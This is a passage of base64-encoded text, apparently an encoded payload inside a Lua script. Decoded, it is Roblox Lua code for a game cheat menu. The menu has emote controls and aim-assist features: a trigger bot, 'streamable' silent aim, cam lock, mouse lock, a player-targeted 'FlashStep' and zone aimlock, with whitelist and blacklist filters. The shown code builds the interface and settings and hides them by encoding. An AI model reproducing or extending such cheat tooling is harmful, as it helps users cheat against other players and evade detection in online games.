iLCAiRW1vdGVMb29wIiwgNDkpCiAgICAKICAgIC0tIEVtb3RlIENvbnRyb2wgQnV0dG9ucwogICAgZG8KICAgICAgICBsb2NhbCBFbW90ZUJ0bkZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgRW1vdGVCdG5GcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDYwKQogICAgICAgIEVtb3RlQnRuRnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBFbW90ZUJ0bkZyYW1lLkxheW91dE9yZGVyID0gNTAKICAgICAgICBFbW90ZUJ0bkZyYW1lLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgICAgICAKICAgICAgICBsb2NhbCBMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJR3JpZExheW91dCIpCiAgICAgICAgTGF5b3V0LkNlbGxTaXplID0gVURpbTIubmV3KDAuNDgsIDAsIDAsIDI1KQogICAgICAgIExheW91dC5DZWxsUGFkZGluZyA9IFVEaW0yLm5ldygwLjAyLCAwLCAwLCA1KQogICAgICAgIExheW91dC5Ib3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcgogICAgICAgIExheW91dC5QYXJlbnQgPSBFbW90ZUJ0bkZyYW1lCiAgICAgICAgCiAgICAgICAgLS0gUGxheSBCdXR0b24KICAgICAgICBsb2NhbCBQbGF5QnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBQbGF5QnRuLlNpemUgPSBVRGltMi5uZXcoMC40OCwgMCwgMCwgMjUpCiAgICAgICAgUGxheUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNzAsIDEzMCwgMTgwKQogICAgICAgIFBsYXlCdG4uVGV4dCA9ICLilrYgUExBWSIKICAgICAgICBQbGF5QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFBsYXlCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgUGxheUJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgUGxheUJ0bi5QYXJlbnQgPSBFbW90ZUJ0bkZyYW1lCiAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIFBsYXlCdG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICAgICAgCiAgICAgICAgUGxheUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgUGxheUVtb3RlKCkKICAgICAgICBlbmQpCiAgICAgICAgCiAgICAgICAgLS0gU3RvcC9GcmVlemUgQnV0dG9uCiAgICAgICAgbG9jYWwgU3RvcEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgU3RvcEJ0bi5TaXplID0gVURpbTIubmV3KDAuNDgsIDAsIDAsIDI1KQogICAgICAgIFN0b3BCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE4MCwgNzAsIDcwKQogICAgICAgIFN0b3BCdG4uVGV4dCA9ICLilqAgRlJFRVpFIgogICAgICAgIFN0b3BCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgU3RvcEJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBTdG9wQnRuLlRleHRTaXplID0gMTAKICAgICAgICBTdG9wQnRuLlBhcmVudCA9IEVtb3RlQnRuRnJhbWUKICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgU3RvcEJ0bikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkKICAgICAgICAKICAgICAgICBTdG9wQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBGcmVlemVFbW90ZSgpCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIC0tIFN0b3AgQ29tcGxldGVseSBCdXR0b24KICAgICAgICBsb2NhbCBTdG9wQ29tcGxldGVseUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgU3RvcENvbXBsZXRlbHlCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjQ4LCAwLCAwLCAyNSkKICAgICAgICBTdG9wQ29tcGxldGVseUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCkKICAgICAgICBTdG9wQ29tcGxldGVseUJ0bi5UZXh0ID0gIuKcliBTVE9QIgogICAgICAgIFN0b3BDb21wbGV0ZWx5QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFN0b3BDb21wbGV0ZWx5QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIFN0b3BDb21wbGV0ZWx5QnRuLlRleHRTaXplID0gMTAKICAgICAgICBTdG9wQ29tcGxldGVseUJ0bi5QYXJlbnQgPSBFbW90ZUJ0bkZyYW1lCiAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIFN0b3BDb21wbGV0ZWx5QnRuKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQogICAgICAgIAogICAgICAgIFN0b3BDb21wbGV0ZWx5QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBTdG9wRW1vdGUoKQogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSBVcGRhdGUgZW1vdGUgc3BlZWQgaW4gcmVhbC10aW1lIHdoZW4gc2xpZGVyIGNoYW5nZXMKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgaWYgQ29uZmlnLkVtb3RlVHJhY2sgYW5kIENvbmZpZy5FbW90ZVBsYXlpbmcgYW5kIG5vdCBDb25maWcuRW1vdGVGcm96ZW4gdGhlbgogICAgICAgICAgICAgICAgQ29uZmlnLkVtb3RlVHJhY2s6QWRqdXN0U3BlZWQoQ29uZmlnLkVtb3RlU3BlZWQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQoKICAgIC0tID09PSBSSUdIVCBQQU5FTCBUQUJTID09PQogICAgCiAgICAtLSBBaW0gVGFiIChXYXMgVHJpZ2dlciBCb3QpCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLkFpbSwgIlRyaWdnZXIgQm90IFNldHRpbmdzIiwgMSkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5BaW0sICJFbmFibGUgVHJpZ2dlciBCb3QiLCAiVHJpZ2dlckJvdCIsIDIpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5BaW0sICJNYXggRGlzdGFuY2UiLCAiVHJpZ2dlckRpc3RhbmNlIiwgMykKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5BaW0sICJTaWxlbnQgQWltIChTdHJlYW1hYmxlKSIsIDQpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuQWltLCAiRW5hYmxlIFNpbGVudCBBaW0iLCAiU2lsZW50QWltIiwgNSkKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5BaW0sICJTaWxlbnQgRk9WIFJhZGl1cyIsICJTaWxlbnRGT1YiLCA2LCAwLCAxMDAwLCAwKQogICAgY3JlYXRlSW5wdXQoUGFnZXMuQWltLCAiTWF4IFJhbmdlIiwgIlNpbGVudFJhbmdlIiwgNykKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5BaW0sICJTaG93IEZPViBDaXJjbGUiLCAiU2hvd0ZPViIsIDgpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLkFpbSwgIlNpbGVudCBBaW0gTG9jayBLZXkiLCAiU2lsZW50QWltS2V5IiwgOSkKICAgIAogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkFpbSwgIkVuYWJsZSBGaWx0ZXIgKFdoaXRlbGlzdC9CbGFja2xpc3QpIiwgIkFpbUZpbHRlciIsIDEwKQogICAgbG9jYWwgRmlsdGVyTW9kZUJ0biA9IGNyZWF0ZUN5Y2xlKFBhZ2VzLkFpbSwgIkZpbHRlciBNb2RlIiwgIkFpbUZpbHRlck1vZGUiLCB7IldoaXRlbGlzdCIsICJCbGFja2xpc3QifSwgMTEpCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgTGlzdEZyYW1lID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIpCiAgICAgICAgTGlzdEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTIwKQogICAgICAgIExpc3RGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIExpc3RGcmFtZS5MYXlvdXRPcmRlciA9IDEyCiAgICAgICAgTGlzdEZyYW1lLlBhcmVudCA9IFBhZ2VzLkFpbQogICAgICAgIAogICAgICAgIGxvY2FsIFVJTGlzdCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikKICAgICAgICBVSUxpc3QuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTmFtZQogICAgICAgIFVJTGlzdC5QYXJlbnQgPSBMaXN0RnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBmdW5jdGlvbiBSZWZyZXNoRmlsdGVyTGlzdCgpCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKExpc3RGcmFtZTpHZXRDaGlsZHJlbigpKSBkbyBpZiB2OklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RhdHVzID0gQ29uZmlnLkFpbUZpbHRlckxpc3RbcC5OYW1lXQogICAgICAgICAgICAgICAgICAgIGlmIHN0YXR1cyA9PSAiV2hpdGVsaXN0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAwKSAtLSBWZXJ0CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHN0YXR1cyA9PSAiQmxhY2tsaXN0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAwLCAwKSAtLSBSb3VnZQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKSAtLSBHcmlzCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgYnRuLlRleHQgPSBwLkRpc3BsYXlOYW1lIC4uICIgKEAiIC4uIHAuTmFtZSAuLiAiKSIKICAgICAgICAgICAgICAgICAgICBidG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgYnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRTaXplID0gOQogICAgICAgICAgICAgICAgICAgIGJ0bi5OYW1lID0gcC5OYW1lCiAgICAgICAgICAgICAgICAgICAgYnRuLlBhcmVudCA9IExpc3RGcmFtZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgY29ybmVyLlBhcmVudCA9IGJ0bgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudFN0YXR1cyA9IENvbmZpZy5BaW1GaWx0ZXJMaXN0W3AuTmFtZV0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5BaW1GaWx0ZXJNb2RlID09ICJXaGl0ZWxpc3QiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGN1cnJlbnRTdGF0dXMgPT0gIldoaXRlbGlzdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5BaW1GaWx0ZXJMaXN0W3AuTmFtZV0gPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkFpbUZpbHRlckxpc3RbcC5OYW1lXSA9ICJXaGl0ZWxpc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY3VycmVudFN0YXR1cyA9PSAiQmxhY2tsaXN0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkFpbUZpbHRlckxpc3RbcC5OYW1lXSA9IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuQWltRmlsdGVyTGlzdFtwLk5hbWVdID0gIkJsYWNrbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgUmVmcmVzaEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgUmVmcmVzaEJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIwKQogICAgICAgIFJlZnJlc2hCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgUmVmcmVzaEJ0bi5UZXh0ID0gIlJFRlJFU0ggUExBWUVSIExJU1QiCiAgICAgICAgUmVmcmVzaEJ0bi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBSZWZyZXNoQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIFJlZnJlc2hCdG4uVGV4dFNpemUgPSA5CiAgICAgICAgUmVmcmVzaEJ0bi5MYXlvdXRPcmRlciA9IDEzCiAgICAgICAgUmVmcmVzaEJ0bi5QYXJlbnQgPSBQYWdlcy5BaW0KICAgICAgICBsb2NhbCBSQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgUkNvcm5lci5QYXJlbnQgPSBSZWZyZXNoQnRuCiAgICAgICAgCiAgICAgICAgUmVmcmVzaEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KFJlZnJlc2hGaWx0ZXJMaXN0KQogICAgICAgIEZpbHRlck1vZGVCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChSZWZyZXNoRmlsdGVyTGlzdCkKICAgICAgICBSZWZyZXNoRmlsdGVyTGlzdCgpCiAgICBlbmQKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5BaW0sICJDYW0gTG9jayAoTWFudWFsKSIsIDE0KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkFpbSwgIkVuYWJsZSBDYW0gTG9jayIsICJBaW1sb2NrIiwgMTUpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLkFpbSwgIkNhbSBMb2NrIEtleSIsICJBaW1sb2NrS2V5IiwgMTYpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuQWltLCAiTW91c2UgTG9jayAoSG9sZCBSaWdodCBDbGljaykiLCAxNikKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5BaW0sICJFbmFibGUgTW91c2UgTG9jayIsICJNb3VzZUNsaWNrTG9jayIsIDE3KQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLkFpbSwgIkxvY2sgRk9WIFJhZGl1cyIsICJNb3VzZUNsaWNrRk9WIiwgMTgsIDAsIDUwMCwgMTAwKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkFpbSwgIlRlYW0gQ2hlY2siLCAiVGVhbUNoZWNrIiwgMTkpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuQWltLCAiVHJpZ2dlciBGbGFzaFN0ZXAgKE1vdXNlIE92ZXIpIiwgMTkpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuQWltLCAiRW5hYmxlIFRyaWdnZXIgRmxhc2hTdGVwIiwgIlRyaWdnZXJGbGFzaFN0ZXAiLCAyMCkKICAgIAogICAgZG8KICAgICAgICBsb2NhbCBEcm9wRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBEcm9wRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgRHJvcEZyYW1lLkxheW91dE9yZGVyID0gMjEKICAgICAgICBEcm9wRnJhbWUuUGFyZW50ID0gUGFnZXMuQWltCiAgICAgICAgCiAgICAgICAgbG9jYWwgRHJvcENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBEcm9wQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERyb3BDb3JuZXIuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgbG9jYWwgRHJvcFN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKSBEcm9wU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0NSkgRHJvcFN0cm9rZS5UaGlja25lc3MgPSAxIERyb3BTdHJva2UuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgRHJvcExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIERyb3BMYWJlbC5UZXh0ID0gIlRhcmdldCBQbGF5ZXIiCiAgICAgICAgRHJvcExhYmVsLlNpemUgPSBVRGltMi5uZXcoMC40LCAwLCAxLCAwKQogICAgICAgIERyb3BMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIERyb3BMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBEcm9wTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1NZWRpdW0KICAgICAgICBEcm9wTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICBEcm9wTGFiZWwuVGV4dFNpemUgPSA5CiAgICAgICAgRHJvcExhYmVsLlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIGxvY2FsIERyb3BQYWQgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpIERyb3BQYWQuUGFkZGluZ0xlZnQgPSBVRGltLm5ldygwLCAxMCkgRHJvcFBhZC5QYXJlbnQgPSBEcm9wTGFiZWwKICAgICAgICAKICAgICAgICBsb2NhbCBEcm9wQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBEcm9wQnRuLlNpemUgPSBVRGltMi5uZXcoMC41NSwgMCwgMC43LCAwKQogICAgICAgIERyb3BCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC40MiwgMCwgMC4xNSwgMCkKICAgICAgICBEcm9wQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIERyb3BCdG4uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgRHJvcEJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBEcm9wQnRuLlRleHRTaXplID0gOAogICAgICAgIERyb3BCdG4uVGV4dCA9IChDb25maWcuVHJpZ2dlckZsYXNoU3RlcFVzZXIgfj0gIiIgYW5kIENvbmZpZy5UcmlnZ2VyRmxhc2hTdGVwVXNlcikgb3IgIkFueSBQbGF5ZXIiCiAgICAgICAgRHJvcEJ0bi5QYXJlbnQgPSBEcm9wRnJhbWUKICAgICAgICBsb2NhbCBEQkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBEQkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKSBEQkNvcm5lci5QYXJlbnQgPSBEcm9wQnRuCiAgICAgICAgCiAgICAgICAgbG9jYWwgRHJvcExpc3QgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIikKICAgICAgICBEcm9wTGlzdC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMTUwKQogICAgICAgIERyb3BMaXN0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDUsIDAsIDM1KQogICAgICAgIERyb3BMaXN0LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKQogICAgICAgIERyb3BMaXN0LkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBEcm9wTGlzdC5WaXNpYmxlID0gZmFsc2UKICAgICAgICBEcm9wTGlzdC5TY3JvbGxCYXJUaGlja25lc3MgPSAyCiAgICAgICAgRHJvcExpc3QuQXV0b21hdGljQ2FudmFzU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICAgICAgRHJvcExpc3QuWkluZGV4ID0gNQogICAgICAgIERyb3BMaXN0LlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIGxvY2FsIERMQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIERMQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERMQ29ybmVyLlBhcmVudCA9IERyb3BMaXN0CiAgICAgICAgbG9jYWwgRExMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpIERMTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyIERMTGF5b3V0LlBhcmVudCA9IERyb3BMaXN0CiAgICAgICAgCiAgICAgICAgbG9jYWwgaXNEcm9wT3BlbiA9IGZhbHNlCiAgICAgICAgRHJvcEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaXNEcm9wT3BlbiA9IG5vdCBpc0Ryb3BPcGVuCiAgICAgICAgICAgIERyb3BMaXN0LlZp" .. "c2libGUgPSBpc0Ryb3BPcGVuCiAgICAgICAgICAgIGlmIGlzRHJvcE9wZW4gdGhlbgogICAgICAgICAgICAgICAgRHJvcEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTkwKQogICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoRHJvcExpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8gaWYgdjpJc0EoIlRleHRCdXR0b24iKSB0aGVuIHY6RGVzdHJveSgpIGVuZCBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gYWRkT3B0aW9uKG5hbWUsIHZhbCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICAgICAgICAgICAgICBidG4uVGV4dCA9IG5hbWUKICAgICAgICAgICAgICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgICAgICBidG4uVGV4dFNpemUgPSA4CiAgICAgICAgICAgICAgICAgICAgYnRuLlpJbmRleCA9IDYKICAgICAgICAgICAgICAgICAgICBidG4uUGFyZW50ID0gRHJvcExpc3QKICAgICAgICAgICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5UcmlnZ2VyRmxhc2hTdGVwVXNlciA9IHZhbAogICAgICAgICAgICAgICAgICAgICAgICBEcm9wQnRuLlRleHQgPSB2YWwgPT0gIiIgYW5kICJBbnkgUGxheWVyIiBvciB2YWwKICAgICAgICAgICAgICAgICAgICAgICAgaXNEcm9wT3BlbiA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIERyb3BMaXN0LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgYWRkT3B0aW9uKCItLSBBbnkgUGxheWVyIC0tIiwgIiIpCiAgICAgICAgICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGFkZE9wdGlvbihwLkRpc3BsYXlOYW1lIC4uICIgKEAiIC4uIHAuTmFtZSAuLiAiKSIsIHAuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuQWltLCAiWm9uZSBBaW1sb2NrIChBdXRvKSIsIDIxKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkFpbSwgIkVuYWJsZSBab25lIExvY2siLCAiWm9uZUxvY2siLCAyMikKICAgIGNyZWF0ZUtleWJpbmQoUGFnZXMuQWltLCAiWm9uZSBLZXkiLCAiWm9uZUtleSIsIDIzKQogICAgY3JlYXRlSW5wdXQoUGFnZXMuQWltLCAiWm9uZSBEaXN0YW5jZSIsICJab25lRGlzdGFuY2UiLCAyNCkKICAgIGNyZWF0ZUlucHV0KFBhZ2VzLkFpbSwgIkxvY2sgRHVy